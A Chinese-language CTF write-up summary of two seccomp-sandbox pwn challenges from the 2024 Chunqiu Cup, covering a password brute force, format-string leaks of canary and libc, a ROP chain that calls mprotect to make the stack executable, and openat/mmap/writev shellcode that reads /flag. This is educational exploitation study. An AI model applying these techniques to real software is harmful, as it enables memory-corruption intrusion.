---
title: web选手入门pwn(18) 2024春秋杯夏季赛两道沙箱题
contest: 春秋杯
year: 2024
difficulty: medium
vuln_type: pwn_unknown
tags: [seccomp, mprotect-RWX, openat, mmap, writev, prng爆破, shellcode]
attack_chain: 题目1逐字符8位a-z爆破password(8*26=208次)通过successfully+power!!!双信号退出/sendlineafter power!!!触发fmt串%9$p-%10$p-%15$p泄canary+stack+libc/mprotect(stack_base,0x10000,7)改栈为RWX/写ORW-shellcode 题目2单条read读shellcode后跳入栈+writev核弹
key_payload: 题目1 payload = A*56 + p64(canary) + p64(stack) + p64(mprotect_args) + asm(shellcode)  题目2 shellcode 写/flag到0x1337500+writev结构体到0x1337510+openat(257)+mmap(9)+writev(20)
one_liner: 春秋杯两道沙箱题打通用户态shellcode三件套(mprotect+openat+mmap+writev)。
lesson: seccomp沙箱下system/binsh失效必须ORW；writev能一次把多块非连续内存写到fd；mprotect改栈权限+跳回栈执行是seccomp题最干净的RCE路径。
quality: high
---

# web选手入门pwn(18) 2024 春秋杯夏季赛两道沙箱题

## 题目1: SavethePrincess — 8 字符密码爆破 + 沙箱 ORW
- **密码爆破**：8 字符密码逐位 a-z 爆破（8 * 26 = 208 次），通过两阶段响应区分
  - `successfully` → 整段命中
  - 响应中含 `chr(i+1)` 字符 → 第 i+1 位命中
  - 用 `replace_char_at_index` 维护当前猜测
- **栈信息泄露**：login 后 sendlineafter("power!!!") 触发 `printf` 自动调用，`%9$p-%10$p-%15$p` 拿 canary(9) + 栈地址(10) + `__libc_start_main+48`(15)
- **栈地址还原**：`stack_base = int(ret[22:31]+'000', 16)` 把栈地址低位清零
- **mprotect 改栈权限**：
  - `pop_rdi = libc_base + 0x2a3e5`
  - `pop_rsi = libc_base + 0x2be51`
  - `pop_rdx_r12 = libc_base + 0x11f2e7`
  - `mprotect_addr = libc_base + libc.sym['mprotect']`
  - payload = `A*56 + p64(canary) + p64(stack) + pop_rdi(stack_base) + pop_rsi(0x10000) + pop_rdx_r12(7, 0) + mprotect_addr`
- **ORW shellcode 写在栈上**：
  - openat(257) `sub rdi, 100` + `mov rsi, rsp` 打开 `/flag`
  - mmap(9) 在 `0x10000` 分配 RWX 区
  - sendfile/write(1) 输出

## 题目2: Shuffled_Execution — 单次 shellcode + writev 核弹
- 程序只允许单次 read，shellcode 必须在 read 缓冲中执行
- writev 核弹（绕过单次 write 长度限制）：
  - `mov rdi, 0x1337500` 写 `/flag` 字符串
  - `mov rdi, 0x1337510` 写 iovec.iov_base = `0x1338000`
  - `mov rdi, 0x1337518` 写 iovec.iov_len = `0x100`
  - openat(257, "0x1337500") → fd
  - mmap(9, 0x1338000, 0x100, 7, 0x12, 3, 0) 映射读出缓冲区
  - writev(20, 1, 0x1337510, 1) 一次写多块到 stdout
- 关键 syscall 号：openat=257, mmap=9, writev=20

## 经验提炼
- 沙箱题三件套：mprotect 改栈 + openat + mmap + writev
- printf 自带 format string 时即使没明显 fmt 漏洞，也能用 `%p` 序列读栈内容
- 单次 read 场景：shellcode 末尾用 `jmp rsp` 跳到刚写入的位置
